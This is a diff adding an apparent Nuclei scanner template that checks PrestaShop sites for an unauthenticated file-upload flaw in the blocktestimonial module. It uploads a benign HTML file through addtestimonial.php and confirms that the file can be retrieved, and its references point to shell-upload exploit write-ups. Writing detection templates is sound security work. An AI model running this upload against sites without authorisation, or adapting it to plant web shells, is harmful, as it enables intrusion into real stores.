@@ -1,0 +1,74 @@
+id: prestashop-blocktestimonial-file-upload
+
+info:
+  name: Prestashop Blocktestimonial Modules - File Upload Vulnerability
+  author: MaStErChO
+  severity: critical
+  reference:
+    - https://3xploit7.blogspot.com/2016/12/pretashop-blocktestimonial-upload-shell.html
+    - https://github.com/indoxploit-coders/blocktestimonial-file-upload
+    - https://exploit.linuxsec.org/prestashop-module-blocktestimonial-file-upload-auto-exploit
+  metadata:
+    max-request: 2
+    framework: prestashop
+    shodan-query: "http.component:\"prestashop\""
+    product: ap_pagebuilder
+    vendor: apollotheme
+  tags: intrusive,file-upload,blocktestimonial,prestashop
+variables:
+  filename: '{{rand_base(7, "abc")}}'
+  data: '{{rand_base(6, "abc")}}'
+
+http:
+  - raw:
+      - |
+        POST /modules/blocktestimonial/addtestimonial.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryLSo7Btb6nGcpR9Cl
+
+        ------WebKitFormBoundaryLSo7Btb6nGcpR9Cl
+        Content-Disposition: form-data; name="testimonial_submitter_name"
+
+        {{data}}
+        ------WebKitFormBoundaryLSo7Btb6nGcpR9Cl
+        Content-Disposition: form-data; name="testimonial_title"
+
+        {{data}}
+        ------WebKitFormBoundaryLSo7Btb6nGcpR9Cl
+        Content-Disposition: form-data; name="testimonial_main_message"
+
+        {{data}}
+        ------WebKitFormBoundaryLSo7Btb6nGcpR9Cl
+        Content-Disposition: form-data; name="testimonial_img"; filename="{{filename}}.html"
+        Content-Type: text/html
+
+        <html>
+        <body>
+        <h1>{{data}}</h1>
+        </body>
+        </html>
+
+        ------WebKitFormBoundaryLSo7Btb6nGcpR9Cl
+        Content-Disposition: form-data; name="testimonial"
+
+        Submit Testimonial
+        ------WebKitFormBoundaryLSo7Btb6nGcpR9Cl--
+
+      - |
+        GET /upload/{{filename}}.html HTTP/1.1
+        Host: {{Hostname}}
+
+    host-redirects: true
+    max-redirects: 3
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body_1
+        words:
+          - "Your testimonial was submitted successfully."
+
+      - type: word
+        part: body_2
+        words:
+          - "{{data}}"
+# digest: 4a0a00473045022100c551350374e741c5a5b77ec1d0995a24f6803d5ca5914d9f442d825848f0fe8f0220132f3392c32167650a9d9de3a86e2fa46f63d901a58e96aaacfde9ff58fdfd89:922c64590222798bb761d5b6d8e72950
